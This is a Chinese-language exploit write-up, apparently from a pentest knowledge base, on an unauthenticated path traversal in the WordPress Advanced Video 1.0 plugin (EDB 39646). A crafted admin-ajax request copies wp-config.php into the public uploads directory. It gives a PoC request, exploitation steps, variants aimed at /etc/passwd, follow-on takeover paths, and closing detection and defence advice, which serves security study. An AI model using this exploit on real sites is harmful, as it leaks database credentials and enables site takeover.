---
id: web-php-file-inclusion-wordpress-advanced-video-thumb-lfi-wpconfig
title: WordPress Advanced Video 1.0 插件 ave_publishPost 的 thumb 路径穿越：wp-config.php 被附件缩略图流程复制到 uploads 后公开下载
type: scenario
domain: web
path: web/php/file-inclusion
technique: wordpress-advanced-video-thumb-path-traversal-wpconfig-copy
aliases:
- EDB 39646
- Advanced Video 1.0 LFI
- advanced-video-embed-embed-videos-or-playlists
- ave_publishPost
- thumb=../wp-config.php
- WordPress 缩略图路径穿越
- wp-config.php 泄露
tags:
- wordpress
- php
- plugin
- lfi
- path-traversal
- admin-ajax
- wp-config
- credential-disclosure
- unauthenticated
cve: []
severity: high
confidence: high
status: verified
affected_versions: '1.0'
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V659
  verified_at: '2026-11-13T06:51:09+08:00'
  notes: 已对照原文核对：wpscan 截图显示 advanced-video 插件 Version 1.0，EDB 39646 标题、thumb=../wp-config.php 请求、uploads/1140321183.jpeg 内容泄露均有截图佐证；PoC 请求方法已按 EDB 脚本 urllib2.urlopen 更正为 GET。未复现利用。
---

## 一句话结论

WordPress 插件 Advanced Video 1.0 的 `admin-ajax.php?action=ave_publishPost` 不校验 `thumb` 参数，传入 `thumb=../wp-config.php` 后，附件缩略图处理流程会把 wp-config.php 当作图片源复制到 `wp-content/uploads/` 下（文件名形如 `<数字>.jpeg`），未登录攻击者直接从 uploads 目录下载该“图片”即可获得数据库账号口令与认证盐。

## 原理

- Advanced Video 插件通过 `admin-ajax.php` 的 `ave_publishPost` action 创建文章并设置缩略图：实现中把用户提交的 `thumb` 值直接当作服务器本地文件路径交给 WordPress 的附件/图片处理逻辑，没有做 `realpath` 白名单或 `..` 过滤。
- WordPress 生成附件缩略图时会读取“源图片”并把处理结果作为新附件写入 uploads 目录。`../wp-config.php` 并不是图片，但处理链会先读取该文件内容并以附件形式落盘，最终 uploads 中出现一个内容为 wp-config.php 原文的 `.jpeg` 文件。
- wp-config.php 明文保存 `DB_NAME`、`DB_USER`、`DB_PASSWORD`、`DB_HOST` 以及认证密钥/盐；泄露后若 3306 可达可直接连库，或利用盐伪造登录 Cookie / 进一步接管后台。
- 链路成立的三要素都是默认行为：admin-ajax 对未登录用户开放该 action、路径穿越由插件参数直接带入、复制结果落在 Web 可访问的 uploads 目录，因此无需后台凭据即可完成“任意本地文件复制到可下载目录”。
- EDB 39646 把这个思路脚本化：随机生成 title/short/term，请求 `action=ave_publishPost&thumb=../wp-config.php` 创建文章，再访问 `/?p=<文章 id>`，从 `attachment-post-thumbnail` 的 URL 中解析出复制后的文件地址并下载。

## 触发条件

- 目标为 WordPress，且启用 Advanced Video 插件 1.0（`/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/` 可访问，readme 标注版本 1.0）。
- `wp-admin/admin-ajax.php` 可访问，`ave_publishPost` action 未做登录/权限校验（插件默认行为）。
- Web 进程对 `wp-config.php` 可读（WordPress 正常运行的前提），uploads 目录可写且可被 HTTP 访问。
- 目标使用自签名 HTTPS 时，利用脚本需要关闭证书校验，否则 Python urllib 报 `CERTIFICATE_VERIFY_FAILED`。

## 利用步骤

1. 指纹识别插件与版本：`wpscan --url https://<target>/blogblog/ -e ap --plugins-detection aggressive --disable-tls-checks`，确认 `advanced-video-embed-embed-videos-or-playlists` 为 1.0。
2. 获取 EDB 39646 脚本，把脚本中的 `url` 改为实际站点地址；HTTPS 自签名场景加入 `ssl._create_default_https_context = ssl._create_unverified_context`。
3. 运行脚本，向 `wp-admin/admin-ajax.php?action=ave_publishPost&title=<rand>&short=rnd&term=rnd&thumb=../wp-config.php` 发起请求，插件创建文章并触发 wp-config.php 的复制。
4. 脚本从返回页面解析 `attachment-post-thumbnail` 中的地址；也可人工访问 `https://<target>/blogblog/wp-content/uploads/`，按修改时间挑出新增的 `<数字>.jpeg`。
5. 下载并查看该文件，得到 `DB_USER`/`DB_PASSWORD` 等配置；随后直连 MySQL 或读取 `wp_users` 哈希继续利用。

## PoC

```text
GET /blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=123&short=rnd&term=rnd&thumb=../wp-config.php HTTP/1.1
Host: <target>
```

```bash
# EDB 39646 会先创建文章，再从 /?p=<id> 页面解析复制后的附件地址
python2 39646.py
# 复制结果形如：
# https://<target>/blogblog/wp-content/uploads/1140321183.jpeg
wget --no-check-certificate https://<target>/blogblog/wp-content/uploads/1140321183.jpeg
cat 1140321183.jpeg   # 内容即 wp-config.php 原文
```

## 变体与关联

- 变体：`thumb` 指向其它服务器本地敏感文件（`../../.htaccess`、`/etc/passwd`、插件配置文件、备份 SQL），只要 Web 进程可读且缩略图流程接受，都会被复制到 uploads 形成可下载副本。
- 变体：uploads 未开目录列表时，仍可从 `/?p=<文章 id>` 的附件页面取得复制后的文件名；文件名与复制时间相关，可按时间排序或从 RSS 中定位。
- 变体：同类“插件参数路径穿越 → 服务端复制/读取本地文件”的模式不限于 Advanced Video，审计插件 `admin-ajax` action 里的文件路径参数（`thumb`、`avatar`、`import` 等）时应重点检查是否做 `realpath` 校验。
- 关联：[[web-php-wordpress-db-hash-update-plugin-credential-harvest]]（拿到 DB 凭据后改 wp_users 哈希接管后台）、[[web-php-wordpress-backup-sql-phpass-credential]]（wp_users 哈希破解与口令复用）、[[pentest-initial-access-mysql-weak-password-outfile-webshell]]（拿到 MySQL 凭据后的写马路径）。
- 边界：插件未启用、非 1.0 版本且已修复该参数校验、uploads 不可写、wp-config.php 不在默认上级路径、Web 进程无读权限时失效。

## 检测与防御

- 检测：`admin-ajax.php` 中 `action=ave_publishPost` 且 `thumb` 含 `../`、`..%2f` 或绝对路径的请求；uploads 目录短时间出现 `<数字>.jpeg` 且 `file` 识别为 ASCII/PHP 而非图片；文章数量异常增长。
- 防御：升级或停用 Advanced Video 插件；对 `thumb` 等文件路径参数做 `realpath` 白名单并拒绝 `..`；uploads 目录关闭脚本执行与目录列表；限制 `admin-ajax.php` 的未登录 action；把 wp-config.php 移出 Web 根（WordPress 支持在上级目录放置配置）。
